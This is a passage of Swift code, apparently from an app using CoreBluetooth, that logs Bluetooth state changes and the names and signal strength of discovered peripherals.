        case .poweredOff:
            logToConsole("Bluetooth is off.", category: 3)
        case .unauthorized:
            logToConsole("Bluetooth permission is blocked.", category: 3)
        case .unsupported:
            logToConsole("Bluetooth isn’t supported on this device.", category: 2)
        case .resetting:
            logToConsole("Bluetooth is resetting…", category: 3)
        default:
            logToConsole("Bluetooth is unavailable.", category: 3)
        }
    }

    func centralManager(_ central: CBCentralManager, didDiscover peripheral: CBPeripheral, advertisementData adv: [String: Any], rssi RSSI: NSNumber) {
        guard isDiscoveryLoggingEnabled else { return }
        let name = peripheral.name ?? (adv[CBAdvertisementDataLocalNameKey] as? String)
        if let name { logToConsole("\(name) (RSSI: \(RSSI))", category: 4) }
    }
}
